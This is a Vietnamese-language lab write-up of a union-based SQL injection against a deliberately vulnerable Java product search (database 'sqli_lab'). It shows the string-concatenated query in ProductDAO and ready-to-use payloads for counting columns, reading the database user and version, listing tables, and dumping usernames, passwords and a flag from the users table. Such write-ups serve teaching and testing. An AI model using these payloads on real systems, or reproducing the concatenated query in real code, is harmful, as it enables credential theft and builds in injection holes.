# 📊 Kỹ thuật Khai thác: Union-based SQL Injection

## 1. Bản chất Lỗ hổng
Tại lớp `ProductDAO.java`, phương thức `searchProducts()` tạo câu truy vấn tìm kiếm bằng cách ghép trực tiếp chuỗi từ khóa `keyword`:
```java
String sql = "SELECT id, name, description, category, price, in_stock FROM products WHERE 1=1";
if (keyword != null && !keyword.trim().isEmpty()) {
    sql += " AND (name LIKE '%" + keyword + "%' OR description LIKE '%" + keyword + "%')";
}
```

Do kết quả truy vấn được ánh xạ trực tiếp thành danh sách đối tượng `Product` và hiển thị ra bảng HTML tại `result.jsp`, kẻ tấn công có thể dùng toán tử `UNION SELECT` để hợp nhất kết quả truy vấn gốc với kết quả từ các bảng bí mật khác (như bảng `users`).

## 2. Nguyên tắc Khai thác UNION SELECT
Để thực hiện thành công một cuộc tấn công UNION-based, kẻ tấn công phải thỏa mãn 2 điều kiện tiên quyết của chuẩn SQL:
1. **Số lượng cột** trong mệnh đề `SELECT` của vế thứ hai phải bằng đúng số lượng cột của vế thứ nhất (ở đây là **6 cột**).
2. **Kiểu dữ liệu** của các cột tương ứng phải tương thích với nhau:
   - Cột 1: Số nguyên (ID)
   - Cột 2: Chuỗi (Tên sản phẩm)
   - Cột 3: Chuỗi (Mô tả)
   - Cột 4: Chuỗi (Danh mục)
   - Cột 5: Số thực/Decimal (Giá)
   - Cột 6: Số nguyên (Số lượng tồn kho)

## 3. Quy trình Khai thác Từng bước

### Bước 1: Dò tìm số lượng cột
Nhập vào ô tìm kiếm:
```sql
' ORDER BY 6 -- 
```
Kết quả: Trang hiển thị bình thường.  
Nhập tiếp:
```sql
' ORDER BY 7 -- 
```
Kết quả: Database báo lỗi `Unknown column '7' in 'order clause'`.  
=> Xác định chính xác câu truy vấn có **6 cột**.

### Bước 2: Trích xuất thông tin Database
Nhập payload:
```sql
' UNION SELECT 1, user(), version(), database(), 0.0, 1 -- 
```
Tại bảng kết quả:
- Cột Tên: In ra thông tin `root@localhost` (user hiện tại của MySQL).
- Cột Mô tả: In ra phiên bản MySQL (ví dụ: `8.0.36`).
- Cột Danh mục: In ra tên database hiện tại (`sqli_lab`).

### Bước 3: Thu thập Danh sách Bảng & Cột
Trích xuất tên các bảng trong database:
```sql
' UNION SELECT 1, table_name, table_schema, 'TABLE', 0.0, 1 FROM information_schema.tables WHERE table_schema=database() -- 
```

### Bước 4: Khai thác toàn bộ Dữ liệu Bảng `users` (Dump Credentials & Secret Flags)
Nhập payload:
```sql
' UNION SELECT id, username, password, email, 0.0, id FROM users -- 
```
Toàn bộ tên đăng nhập và mật khẩu của tất cả người dùng trong hệ thống sẽ được in ra công khai trên bảng sản phẩm.

Trích xuất Flag:
```sql
' UNION SELECT id, username, secret_flag, role, 0.0, 1 FROM users -- 
```
Flag thu được: `FLAG{sqli_admin_bypass_master_2026}`.

## 4. Chạy Script khai thác tự động
```bash
python exploit.py
```
Script sẽ tự động dò số cột, trích xuất cấu trúc database và dump toàn bộ dữ liệu bảng `users`.
